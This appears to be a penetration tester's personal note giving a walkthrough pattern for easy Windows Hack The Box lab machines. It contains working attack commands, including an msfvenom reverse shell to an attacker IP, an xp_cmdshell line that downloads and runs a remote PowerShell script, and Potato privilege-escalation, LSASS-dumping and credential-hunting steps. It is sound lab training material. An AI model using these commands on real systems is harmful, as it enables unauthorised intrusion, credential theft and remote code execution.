---
tags: [pentest, htb, windows, easy-box, walkthrough-pattern, both]
type: workflow
---
# Windows Easy Box - Walkthrough Pattern

[[00 - README|Folder index]]

## Hallmarks

- Single-user box (no AD)
- Service with known CVE OR weak / default cred
- SeImpersonatePrivilege after foothold → Potato → SYSTEM

## Typical chain

```text
1. nmap shows 80, 135, 139, 445, 3389 (sometimes 5985)
2. SMB → anon access reveals a share with creds/files
   OR Web (IIS / Tomcat / Jenkins) with default creds
   OR FTP anon with hint
3. Use cred via WinRM (5985) or RDP (3389)
4. user.txt at C:\Users\<user>\Desktop\user.txt
5. `whoami /priv` shows SeImpersonatePrivilege
6. Drop PrintSpoofer / GodPotato → SYSTEM
7. root.txt at C:\Users\Administrator\Desktop\root.txt
```

## Easy box telltale signs

| Port | Easy-path hint |
| --- | --- |
| 21 anon | Look for `users.txt`, `notes`, configs |
| 80 with IIS Manager / phpMyAdmin / phpinfo() | Default creds + upload |
| 445 with anon `Backups` or `IT` share | Browse it; backup files contain creds |
| 1433 with `sa:` blank | `xp_cmdshell` enable → RCE |
| 5985 WinRM | Brute-spray candidate creds via NetExec |
| 8080 / 8081 / 8000 Tomcat | `tomcat:tomcat`, `admin:admin` |

## Initial access recipes

### SMB anon → cred → WinRM

```bash
# Enumerate
nxc smb 10.10.10.x -u '' -p '' --shares
smbmap -H 10.10.10.x -u anonymous
smbclient -L //10.10.10.x/ -N

# Pull anything readable
smbclient //10.10.10.x/Backups -N
smb> recurse on; prompt off; mget *

# Read what you got
grep -RinE "pass|pwd|user" backups/

# Try creds across services
nxc smb 10.10.10.x -u found_user -p found_pass
nxc winrm 10.10.10.x -u found_user -p found_pass

# Shell
evil-winrm -i 10.10.10.x -u found_user -p found_pass
```

### Web admin → file upload → reverse shell

```powershell
# Generate ASPX shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx

# Upload via the admin interface (IIS Manager, Resorter, etc.)

# Listener
nc -lvnp 4444

# Trigger
curl http://target/uploads/shell.aspx
```

### MSSQL `sa:` blank

```bash
impacket-mssqlclient sa:''@10.10.10.x -windows-auth
SQL> EXEC sp_configure 'show advanced options',1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'powershell -nop -c "IEX(IWR http://10.10.14.5/rev.ps1 -UseBasicParsing)"';
```

## Windows easy priv-esc - what works ~90% of the time

```cmd
:: 1. Check privs - the gimme
whoami /priv
whoami /groups

:: 2. Common privileges → known attacks
::    SeImpersonatePrivilege    → Potato (PrintSpoofer / GodPotato / JuicyPotatoNG)
::    SeBackupPrivilege         → read SAM/SYSTEM, secretsdump LOCAL
::    SeDebugPrivilege          → Mimikatz LSASS dump
::    SeTakeOwnershipPrivilege  → grab ownership of any file → ACL → read SAM
::    SeManageVolumePrivilege   → SeManageVolumeExploit

:: 3. Stored creds
cmdkey /list
runas /savecred /user:DOMAIN\admin cmd.exe   :: if /savecred set

:: 4. Service misconfigs (winPEAS / PowerUp does this)
.\winPEASany.exe quiet
.\PowerUp.ps1; Invoke-AllChecks

:: 4b. If you have a Meterpreter session — run this BEFORE or alongside winPEAS (passive, no noise)
::     background → use post/multi/recon/local_exploit_suggester → set SESSION 1 → run
::     Migrate to x64 process first or you'll get false negatives.
::     See [[15.5 - MSF Local Exploit Suggester]]

:: 5. AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: If both = 1: msfvenom -p windows/exec ... -f msi -o evil.msi; msiexec /quiet /i evil.msi
```

## Potato attacks - the bread and butter of easy Windows

```cmd
:: PrintSpoofer (Server 2019/2022, Win10/11 - works best)
PrintSpoofer.exe -i -c "cmd"

:: GodPotato (.NET 4+ available)
GodPotato.exe -cmd "cmd /c whoami"

:: JuicyPotatoNG (older systems / specific CLSIDs)
JuicyPotatoNG.exe -t * -p "cmd.exe"

:: RoguePotato (over network)
RoguePotato.exe -r 10.10.14.5 -e "cmd.exe"
```

## Quick wins to always check after WinRM login

```powershell
# Hidden creds in user's home / Desktop / Documents
Get-ChildItem -Path C:\Users\<user>\ -Recurse -Force -Include *.txt,*.xml,*.config,*.kdbx,*.pfx,*.docx 2>$null

# Unattend / Sysprep files
Get-ChildItem -Path C:\ -Filter "unattend*.xml" -Recurse -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Filter "sysprep.inf" -Recurse -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Filter "web.config" -Recurse -Force -ErrorAction SilentlyContinue

# PowerShell history
Get-Content (Get-PSReadlineOption).HistorySavePath
type "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

# Recent files
Get-ChildItem C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Recent\
```

> [!tip] After every Windows shell
> `whoami /priv` first, `whoami /groups` second. 70% of Windows easy boxes are decided in the first two commands.
